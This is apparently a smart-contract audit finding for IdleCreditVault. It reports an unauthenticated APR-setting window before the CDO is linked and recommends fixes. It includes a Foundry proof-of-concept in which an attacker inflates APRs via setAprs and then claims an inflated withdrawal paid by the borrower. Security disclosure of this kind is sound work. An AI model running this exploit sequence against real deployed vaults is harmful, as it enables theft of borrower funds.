### Title

Unauthenticated pre-link APR takeover lets lenders inflate withdrawal payouts - ([File: contracts/strategies/idle/IdleCreditVault.sol])

### Summary

`IdleCreditVault.setAprs()` and `setAprsWithBuffer()` write `unscaledApr` before calling `setApr()`, while `setApr()` skips its caller check whenever `idleCDO` is unset, allowing any EOA to assume the intended CDO/manager APR-setting privilege during deployment. [1](#0-0) 

### Finding Description

The intended permission boundary is explicit: only the linked CDO or manager may set the APR, but the conditional `if (_cdo != address(0))` disables that boundary until `setWhitelistedCDO()` is called. [2](#0-1) 

The vulnerable sequence is:

1. The strategy proxy is initialized with an owner, manager, borrower, and legitimate APR, leaving `idleCDO == address(0)`. [3](#0-2) 
2. The CDO is initialized; its initializer reads and rescales the current strategy APR, but still does not bind itself to the strategy. [4](#0-3) 
3. An attacker front-runs the owner’s `setWhitelistedCDO()` transaction and calls `strategy.setAprs(20e18, 20e18)`, writing both APR fields up to `DEFAULT_MAX_APR`. [5](#0-4) 
4. The honest owner binds the CDO, permanently restoring authorization while preserving the attacker’s APR. [6](#0-5) 
5. A KYC-passing attacker deposits into AA and calls `requestWithdraw()`, which prices the receipt using the malicious strategy APR and stores the inflated amount in `pendingWithdraws`. [7](#0-6) 
6. `stopEpoch()` pulls the inflated `pendingWithdraws` amount from the honest borrower and sends it to the strategy for the attacker to claim. [8](#0-7) 
7. The attacker calls `claimWithdrawRequest()`, burns the receipt, and receives the funded amount. [9](#0-8) 

The broken invariant is access control over pool pricing: an unprivileged account can exercise the CDO/manager-only APR privilege simply because the CDO linkage has not been written yet.

### Impact Explanation

For a 30-day epoch, 5-day buffer, intended 10% APR, and 1,000,000 USDC pending withdrawal, raising the scaled APR from approximately 11.666e18 to the 20e18 cap inflates the withdrawal receipt by about 5,870 USDC in the first epoch alone. [10](#0-9) 

This is direct theft from the borrower when the borrower funds the inflated receipt; if the borrower does not fund the unauthorized obligation, `stopEpoch()` takes the borrower-default path and freezes the vault’s normal epoch flow. [11](#0-10) 

### Likelihood Explanation

The attack requires a non-atomic deployment sequence in which `IdleCreditVault.initialize()` and CDO initialization have occurred but `setWhitelistedCDO()` has not yet executed. [12](#0-11) 

Factory-deployed vaults are not exposed to the race because `_configureCreditVault()` performs `setAprs()` and `setWhitelistedCDO()` in the same deployment transaction. [13](#0-12) 

Manual or operational deployments that bind the CDO in a later transaction are exposed, and the attacker only needs to be an arbitrary EOA for the APR write or a KYC-passing lender for the full payout path.

### Recommendation

Remove the unauthenticated `idleCDO == address(0)` bypass from `setApr()`, `setAprs()`, and `setAprsWithBuffer()` in `contracts/strategies/idle/IdleCreditVault.sol`.

Bind `idleCDO` atomically during initialization or restrict pre-link APR configuration to `owner()`/`manager`, then require the CDO to perform all later APR changes through the normal `_cdo || manager` check. [14](#0-13) 

Additionally, initialize the strategy and CDO in a single factory transaction or a transactional multicall so no public mempool window exists between CDO initialization and `setWhitelistedCDO()`. [15](#0-14)

pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IdleCDOCreditVault} from "contracts/IdleCDOCreditVault.sol";
import {IdleCDOEpochVariant} from "contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from "contracts/strategies/idle/IdleCreditVault.sol";
import {IERC20Detailed} from "contracts/interfaces/IERC20Detailed.sol";

contract PreLinkAprEscalation is Test {
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    function test_UnauthorizedAprInflationFundsWithdrawal() external {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        address owner = address(this);
        address manager = address(0x100);
        address borrower = address(0x200);
        address attacker = address(0x300);
        address treasury = address(0x400);
        ProxyAdmin admin = new ProxyAdmin();

        IdleCreditVault strategy = IdleCreditVault(address(
            new TransparentUpgradeableProxy(
                address(new IdleCreditVault()),
                address(admin),
                abi.encodeWithSelector(
                    IdleCreditVault.initialize.selector,
                    USDC,
                    owner,
                    manager,
                    borrower,
                    "Borrower",
                    10e18
                )
            )
        ));

        IdleCDOEpochVariant cdo = IdleCDOEpochVariant(address(
            new TransparentUpgradeableProxy(
                address(new IdleCDOEpochVariant()),
                address(admin),
                abi.encodeWithSelector(
                    IdleCDOCreditVault.initialize.selector,
                    0,
                    USDC,
                    treasury,
                    owner,
                    address(0),
                    address(strategy),
                    100_000
                )
            )
        ));

        vm.prank(attacker);
        strategy.setAprs(20e18, 20e18);

        vm.prank(owner);
        strategy.setWhitelistedCDO(address(cdo));

        IERC20Detailed usdc = IERC20Detailed(USDC);
        uint256 depositAmount = 1_000_000e6;
        deal(USDC, attacker, depositAmount);

        vm.startPrank(attacker);
        usdc.approve(address(cdo), depositAmount);
        uint256 trancheShares = cdo.depositAA(depositAmount);
        uint256 requested = cdo.requestWithdraw(trancheShares, cdo.AATranche());
        vm.stopPrank();

        assertGt(requested, depositAmount + 14_000e6);

        vm.prank(manager);
        cdo.startEpoch();

        vm.warp(cdo.epochEndDate() + 1);
        uint256 owed = strategy.pendingWithdraws();
        deal(USDC, borrower, owed);

        vm.prank(borrower);
        usdc.approve(address(cdo), owed);

        vm.prank(manager);
        cdo.stopEpoch(10e18, 0);

        vm.prank(attacker);
        cdo.claimWithdrawRequest();

        assertEq(usdc.balanceOf(attacker), requested);
    }
}

    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == AATranche ? !allowAAWithdrawRequest : !allowBBWithdrawRequest) ||
      !isWalletAllowed(msg.sender)
    );
  
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();

    // we trigger an update accounting to check for eventual losses
    _updateAccounting();

    IdleCreditVault creditVault = IdleCreditVault(strategy);
    if (_amount == 0) {
      _amount = _userTrancheBal(msg.sender, _tranche);
    }
    _underlyings = _trancheToUnderlyings(_amount, _tranche);

    // Programmable borrower deployments do not support instant withdrawals.
    // If apr decresed wrt last epoch, request instant withdraw and burn tranche tokens directly
    // we compare unscaled aprs
    if (_isInstantWithdrawEnabled()) {
      uint256 currentApr = creditVault.unscaledApr();
      if (lastEpochApr > (currentApr + instantWithdrawAprDelta)) {
        // burn strategy tokens from cdo and mint an equal amount to msg.sender as receipt
        creditVault.requestInstantWithdraw(_underlyings, msg.sender);
        // burn tranche tokens and decrease NAV
        _withdrawOps(_amount, _underlyings, _tranche);
        return _underlyings;
      }
    }

    uint256 principal = _underlyings;
    (uint256 interest, int256 diff) = _calcInterestWithdrawRequest(_underlyings, _tranche);
    uint256 totalFees = _totalWithdrawFees(principal, interest);
    // user is requesting principal + interest minus upfront management fee and net performance fee
    _underlyings = principal + interest - totalFees;
    // add expected fees to pending withdraw fees counter
    pendingWithdrawFees += totalFees;

    /// if there is an AA withdrawal the overperformance that the amount withdrawed would have generated for BB tranches
    /// is saved in interestForOverUnderPerformance. This is used to calculate the interest that should be added to the
    /// expectedEpochInterest at the startEpoch.
    /// If there is a BB withdrawal this amount is subtracted from the expectedEpochInterest
    interestForOverUnderPerformance += diff;

    // The receipt is fixed now and leaves live NAV. Charge management fees upfront
    // for the time it waits outside live NAV: remaining buffer plus the next epoch.
    creditVault.requestWithdraw(_underlyings, msg.sender, principal);
    // burn tranche tokens and decrease NAV without interest for the next epoch as it was not yet counted in NAV
    _withdrawOps(_amount, principal, _tranche);

  function _calcInterestWithdrawRequest(uint256 _amount, address _tranche) internal view returns (uint256 _interest, int256 _diff) {
    uint256 _duration = epochDuration;
    if (_duration == 0) {
      return (_interest, _diff);
    }

    uint256 _buffer = bufferPeriod;
    // calculate total vault interest (they don't get the interest for the buffer period for withdraw requests so 
    // we scale it back since _calcInterest is scaling the interest with tht buffer period),
    uint256 totInterest = _calcInterest(_managedContractValue()) * _duration / (_duration + _buffer);
    // calculate total tranche interest for the whole tranche supply
    uint256 totTrancheInterest = _calcTrancheInterestShare(totInterest, _tranche);
    // calculate interest for the given tranche and given amount
    uint256 _trancheBal = _lastSavedNAV(_tranche);
    _interest = _trancheBal == 0 ? 0 : _amount * totTrancheInterest / _trancheBal;
    // calculate the interest that the _amount would have received if there was no split ratio (ie interest split based only on tvl).
    // This is used to calculate the interest that should be added to the expectedEpochInterest when 
    // withdrawing an AA tranche or the interest that should be removed from expectedEpochInterest when
    // withdrawing a BB tranche
    uint256 interestWithoutSplitRatio = _calcInterest(_amount) * _duration / (_duration + _buffer);
    // difference between total interest and tranche interest (positive for AA, negative for BB)
    _diff = int256(interestWithoutSplitRatio) - int256(_interest);

  function _configureCreditVault(
    IdleCDOEpochVariant cv,
    IdleCreditVault strategy,
    CreditVaultParams memory par,
    address keyringWhitelist,
    address manager
  ) internal {
    cv.setEpochParams(par.epochDuration, par.bufferPeriod);
    cv.setInstantWithdrawParams(par.instantWithdrawDelay, par.instantWithdrawAprDelta, par.disableInstantWithdraw);
    cv.setKeyringParams(keyringWhitelist, par.keyringPolicy);
    if (par.isInterestMinted) {
      cv.setIsInterestMinted(par.isInterestMinted);
    }
    cv.setIsDepositDuringEpochDisabled(par.isDepositDuringEpochDisabled);
    cv.setFeeParams(par.feeReceiver, par.fees, feeSplit, par.managementFee);
    cv.setGuardian(manager);
    // setAprs should be done before setWhitelistedCDO
    strategy.setAprs(par.apr, par.apr * (par.epochDuration + par.bufferPeriod) / par.epochDuration);
    strategy.setWhitelistedCDO(address(cv));
  }
